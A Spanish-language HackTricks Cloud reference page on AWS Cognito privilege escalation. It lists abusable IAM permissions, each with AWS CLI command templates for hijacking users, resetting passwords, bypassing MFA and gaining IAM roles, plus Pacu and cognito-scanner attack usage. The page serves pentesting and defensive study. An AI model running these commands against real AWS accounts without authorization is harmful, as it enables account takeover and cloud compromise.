# AWS - Escalada de privilegios en Cognito

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Cognito

Para m치s informaci칩n sobre Cognito, consulta:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Recopilaci칩n de credenciales desde Identity Pool

Dado que Cognito puede otorgar **credenciales de roles IAM** tanto a **usuarios autenticados** como a **usuarios no autenticados**, si localizas el **ID del Identity Pool** de una aplicaci칩n (que deber칤a estar codificado en ella), puedes obtener nuevas credenciales y, por lo tanto, realizar una escalada de privilegios (dentro de una cuenta de AWS donde probablemente ni siquiera ten칤as credenciales previamente).

Para m치s informaci칩n, [**consulta esta p치gina**](../aws-unauthenticated-enum-access/#cognito).

**Impacto potencial:** Escalada directa al rol de servicios adjunto a los usuarios no autenticados (y probablemente al adjunto a los usuarios autenticados).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Con este permiso, puedes **otorgar cualquier rol de cognito** a los usuarios autenticados/no autenticados de la aplicaci칩n de Cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Si la aplicaci칩n de Cognito **no tiene habilitados los usuarios no autenticados**, es posible que tambi칠n necesites el permiso `cognito-identity:UpdateIdentityPool` para habilitarlo.

**Impacto potencial:** Escalada directa de privilegios a cualquier rol de Cognito.

### `cognito-identity:update-identity-pool`

Un atacante con este permiso podr칤a, por ejemplo, configurar un Grupo de Usuarios de Cognito bajo su control u otro proveedor de identidad donde pueda iniciar sesi칩n como una **forma de acceder a este Grupo de Identidades de Cognito**. Luego, simplemente **iniciar sesi칩n** en ese proveedor de usuarios le **permitir치 acceder al rol autenticado configurado en el Grupo de Identidades**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Tambi칠n es posible **abusar este permiso para permitir la autenticaci칩n b치sica**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Impacto Potencial**: Comprometer el rol IAM autenticado configurado dentro del grupo de identidad.

### `cognito-idp:AdminAddUserToGroup`

Esta permiso permite **agregar un usuario de Cognito a un grupo de Cognito**, por lo tanto, un atacante podr칤a abusar de este permiso para agregar un usuario bajo su control a otros grupos con privilegios **mejores** o **diferentes roles IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Impacto Potencial:** Escalada de privilegios a otros grupos de Cognito y roles de IAM adjuntos a Grupos de Pools de Usuarios.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Un atacante con estos permisos podr칤a **crear/actualizar grupos** con **cada rol de IAM que puede ser utilizado por un Proveedor de Identidad de Cognito comprometido** y hacer que un usuario comprometido forme parte del grupo, accediendo a todos esos roles:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Impacto potencial:** Escalada de privilegios a otros roles IAM de Cognito.

### `cognito-idp:AdminConfirmSignUp`

Esta permiso permite **verificar un registro**. Por defecto, cualquiera puede registrarse en aplicaciones de Cognito, si se deja as칤, un usuario podr칤a crear una cuenta con cualquier dato y verificarla con este permiso.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Impacto Potencial:** Escalada de privilegios indirecta al rol IAM del grupo de identidades para usuarios autenticados si puedes registrar un nuevo usuario. Escalada de privilegios indirecta a otras funcionalidades de la aplicaci칩n al poder confirmar cualquier cuenta.

### `cognito-idp:AdminCreateUser`

Esta permiso permitir칤a a un atacante crear un nuevo usuario dentro del grupo de usuarios. El nuevo usuario se crea como habilitado, pero necesitar치 cambiar su contrase침a.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Impacto Potencial:** Escalada de privilegios directa al rol IAM del grupo de identidades para usuarios autenticados. Escalada de privilegios indirecta a otras funcionalidades de la aplicaci칩n al poder crear cualquier usuario

### `cognito-idp:AdminEnableUser`

Este permiso puede ayudar en un escenario muy espec칤fico donde un atacante haya encontrado las credenciales de un usuario deshabilitado y necesite **habilitarlo nuevamente**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Impacto Potencial:** Escalada de privilegios indirecta al rol IAM del grupo de identidades para usuarios autenticados y permisos del usuario si el atacante tuviera credenciales de un usuario deshabilitado.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Este permiso permite iniciar sesi칩n con el [**m칠todo ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Para obtener m치s informaci칩n, sigue el enlace.

### `cognito-idp:AdminSetUserPassword`

Este permiso permitir칤a a un atacante **cambiar la contrase침a de cualquier usuario**, lo que le permitir칤a hacerse pasar por cualquier usuario (que no tenga habilitado el MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Impacto Potencial:** Escalada de privilegios directa a potencialmente cualquier usuario, lo que permite acceder a todos los grupos de los que cada usuario es miembro y acceder al rol IAM autenticado del grupo de identidades.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Un atacante podr칤a potencialmente abusar de este permiso para establecer un tel칠fono m칩vil bajo su control como **MFA de SMS de un usuario**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Similar to the previous one this permission can be used to set MFA preferences of a user to bypass the MFA protection.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Similar to the previous one this permission can be used to set MFA preferences of a user pool to bypass the MFA protection.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Tambi칠n es posible actualizar el grupo de usuarios para cambiar la pol칤tica de MFA. [Verifica el cli aqu칤](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Impacto Potencial:** Escalada de privilegios indirecta a potencialmente cualquier usuario del que el atacante conozca las credenciales, lo que podr칤a permitir evitar la protecci칩n de MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Un atacante con este permiso podr칤a cambiar el correo electr칩nico o n칰mero de tel칠fono u otro atributo de un usuario bajo su control para intentar obtener m치s privilegios en una aplicaci칩n subyacente.\
Esto permite cambiar un correo electr칩nico o n칰mero de tel칠fono y establecerlo como verificado.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Impacto Potencial:** Posible escalada de privilegios indirecta en la aplicaci칩n subyacente utilizando Cognito User Pool que otorga privilegios basados en atributos de usuario.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Un atacante con este permiso podr칤a **crear un nuevo Cliente de User Pool menos restringido** que los clientes de pool existentes. Por ejemplo, el nuevo cliente podr칤a permitir cualquier tipo de m칠todo de autenticaci칩n, no tener ning칰n secreto, tener la revocaci칩n de tokens deshabilitada, permitir que los tokens sean v치lidos por un per칤odo m치s largo...

Lo mismo se puede hacer si en lugar de crear un nuevo cliente, se **modifica uno existente**.

En la [**l칤nea de comandos**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (o en la [**de actualizaci칩n**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) puedes ver todas las opciones, 춰compru칠balo!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Impacto Potencial:** Posible escalada de privilegios indirecta al grupo de identidades autorizadas utilizado por el grupo de usuarios al crear un nuevo cliente que relaje las medidas de seguridad y permita a un atacante iniciar sesi칩n con un usuario que pudo crear.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Un atacante podr칤a abusar de este permiso para crear usuarios subiendo un archivo CSV con nuevos usuarios.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Posible Impacto:** Escalada de privilegios directa al rol IAM del grupo de identidades para usuarios autenticados. Escalada de privilegios indirecta a otras funcionalidades de la aplicaci칩n al poder crear cualquier usuario.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Un atacante podr칤a crear un nuevo proveedor de identidad para luego poder **iniciar sesi칩n a trav칠s de este proveedor**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Impacto Potencial:** Escalada de privilegios directa al rol IAM del grupo de identidades para usuarios autenticados. Escalada de privilegios indirecta a otras funcionalidades de la aplicaci칩n al poder crear cualquier usuario.

### An치lisis de cognito-sync:\*

Esta es una permisi칩n muy com칰n de forma predeterminada en los roles de los Grupos de Identidades de Cognito. Aunque un comod칤n en los permisos siempre parece mal (especialmente viniendo de AWS), **los permisos otorgados no son muy 칰tiles desde la perspectiva de un atacante**.

Esta permisi칩n permite leer la informaci칩n de uso de los Grupos de Identidades e IDs de Identidad dentro de los Grupos de Identidades (que no es informaci칩n sensible).\
Los IDs de Identidad pueden tener [**Conjuntos de Datos**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) asignados a ellos, que son informaci칩n de las sesiones (AWS lo define como un **juego guardado**). Es posible que esto contenga alg칰n tipo de informaci칩n sensible (pero la probabilidad es bastante baja). Puedes encontrar en la [**p치gina de enumeraci칩n**](../aws-services/aws-cognito-enum/) c칩mo acceder a esta informaci칩n.

Un atacante tambi칠n podr칤a usar estos permisos para **inscribirse en un flujo de Cognito que publique cambios** en estos conjuntos de datos o un **lambda que se active en eventos de cognito**. No he visto que se use esto, y no esperar칤a encontrar informaci칩n sensible aqu칤, pero no es imposible.

### Herramientas Autom치ticas

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), el marco de explotaci칩n de AWS, ahora incluye los m칩dulos "cognito\_\_enum" y "cognito\_\_attack" que automatizan la enumeraci칩n de todos los activos de Cognito en una cuenta y se침alan configuraciones d칠biles, atributos de usuario utilizados para el control de acceso, etc., y tambi칠n automatizan la creaci칩n de usuarios (incluido el soporte para MFA) y la escalada de privilegios basada en atributos personalizables modificables, credenciales de grupo de identidades utilizables, roles asumibles en tokens de identidad, etc.

Para obtener una descripci칩n de las funciones de los m칩dulos, consulta la parte 2 de la [publicaci칩n del blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para instrucciones de instalaci칩n, consulta la p치gina principal de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Uso

Uso de muestra de cognito\_\_attack para intentar la creaci칩n de usuarios y todos los vectores de escalada de privilegios contra un grupo de identidades y cliente de grupo de usuarios espec칤ficos:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Ejemplo de uso de cognito\_\_enum para recopilar todos los grupos de usuarios, clientes de grupos de usuarios, grupos de identidades, usuarios, etc. visibles en la cuenta actual de AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) es una herramienta CLI en python que implementa diferentes ataques en Cognito, incluida una escalada de privilegios de privesc.

#### Instalaci칩n
```bash
$ pip install cognito-scanner
```
#### Uso
```bash
$ cognito-scanner --help
```
Para obtener m치s informaci칩n, visita [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos en** **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
